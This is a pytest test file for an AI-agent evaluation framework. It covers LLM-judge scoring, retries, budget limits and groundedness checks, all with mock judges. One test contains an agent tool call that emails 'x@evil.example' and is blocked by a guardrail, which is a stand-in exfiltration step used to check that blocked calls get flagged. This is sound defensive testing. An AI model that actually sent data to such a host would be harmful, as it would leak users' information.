"""Judge and groundedness evaluators with scripted mock judges (no AWS)."""

import json

import pytest

from agentgauge.config import BudgetConfig
from agentgauge.cost import CostTracker, ModelPrice, Pricing
from agentgauge.evaluators import GroundednessEvaluator, JudgeEvaluator
from agentgauge.evaluators.groundedness import extract_claims
from agentgauge.evaluators.judge import build_judge_prompt, parse_verdict
from agentgauge.model_client import MockClient, ModelResponse
from agentgauge.sandbox import Sandbox

from conftest import call, ctx_for, scenario, trace

SB = Sandbox()


def verdict(score, reasoning="ok"):
    return ModelResponse(text=json.dumps({"score": score, "passed": score >= 4, "reasoning": reasoning}))


def good_trace():
    return trace("What is your return policy?",
                 [[call("search_help_docs", {"query": "return policy"}, SB.search_help_docs("return policy"))]],
                 "Items can be returned within 30 days of delivery [help_doc_01].")


def test_parse_verdict_variants():
    assert parse_verdict('{"score": 5, "passed": true, "reasoning": "x"}').score == 5
    assert parse_verdict('Sure!\n```json\n{"score": 3, "passed": false, "reasoning": "x"}\n```').score == 3
    assert parse_verdict('Here: {"score": 4, "passed": true, "reasoning": "x"} done').passed
    for bad in ("", "no json", '{"score": 9, "passed": true, "reasoning": "x"}', '{"score": 4}'):
        with pytest.raises(ValueError):
            parse_verdict(bad)


def test_judge_median_majority_and_agreement(config):
    sc = scenario(rubric="Must state 30 days.")
    judge = MockClient(script=[verdict(5), verdict(3), verdict(4)])
    r = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge))
    assert r.passed and r.required and r.details["final_score"] == 4
    assert r.details["scores"] == [5, 3, 4] and r.details["agreement"] == pytest.approx(2 / 3, abs=1e-3)
    assert "median judge score 4/5" in r.evidence
    # prompt carries rubric, tool calls and final answer
    sent = judge.calls[0]["messages"][0]["content"][0]["text"]
    assert "Must state 30 days." in sent and "search_help_docs" in sent and "<final_answer>" in sent
    assert judge.calls[0]["temperature"] == 0.0


def test_judge_retries_once_on_bad_json(config):
    sc = scenario()
    judge = MockClient(script=[ModelResponse(text="I think it's good"), verdict(5), verdict(5), verdict(5)])
    r = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge))
    assert r.passed and r.details["samples"][0]["retried"] is True
    assert len(judge.calls) == 4
    assert "not valid JSON" in judge.calls[1]["messages"][-1]["content"][0]["text"]


def test_judge_error_after_retry_fails_closed(config):
    sc = scenario()
    judge = MockClient(script=[ModelResponse(text="nope")] * 6)
    r = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge))
    assert not r.passed and "JUDGE ERROR" in r.evidence


def test_judge_advisory_outside_functional_and_na_without_client(config):
    sc = scenario(category="injection")
    judge = MockClient(script=[verdict(2)] * 3)
    r = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge))
    assert not r.passed and not r.required
    na = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config))
    assert not na.applicable


def test_judge_spend_is_tracked_against_session(config):
    sc = scenario()
    tr = CostTracker(Pricing({"mock-model": ModelPrice(input_per_1k=1.0, output_per_1k=1.0)}),
                     BudgetConfig(max_usd_per_session=0.5))
    judge = MockClient(script=[verdict(5)] * 3)
    r = JudgeEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge, tracker=tr))
    # first sample exceeds the tiny session cap, so sampling stops early
    assert len(r.details["samples"]) == 0 or r.details["errors"]
    assert tr.session.calls >= 1


def test_judge_prompt_marks_blocked_calls():
    t = trace("q", [[call("send_email", {"to": "x@evil.example", "subject": "s", "body": "b"}, None,
                          error="BLOCKED by v2 policy: nope", blocked=True)]], "fine")
    assert "BLOCKED by guardrail" in build_judge_prompt(t, scenario())


def test_groundedness_lexical(config):
    sc = scenario()
    g = GroundednessEvaluator()
    ok = g.evaluate(good_trace(), sc, ctx_for(sc, config))
    assert ok.passed and not ok.required and ok.details["ratio"] == 1.0
    bad = trace("What is your return policy?",
                [[call("search_help_docs", {"query": "return policy"}, SB.search_help_docs("return policy"))]],
                "Items can be returned within 90 days. We also offer free lifetime repairs on every product.")
    r = g.evaluate(bad, sc, ctx_for(sc, config))
    assert not r.passed and "90" in r.evidence


def test_claim_extraction_skips_filler_and_questions():
    claims = extract_claims("Hi there! I'd be happy to help. Your order 1047 shipped on Monday. "
                            "Could you share your order number? Let me know if you need anything else.")
    assert claims == ["Your order 1047 shipped on Monday."]


def test_groundedness_llm_mode(config):
    config.groundedness.mode = "llm"
    sc = scenario()
    judge = MockClient(script=[ModelResponse(text='{"claims": [{"claim": 1, "supported": false}]}')])
    r = GroundednessEvaluator().evaluate(good_trace(), sc, ctx_for(sc, config, judge_client=judge))
    assert r.details["mode"] == "llm" and not r.passed
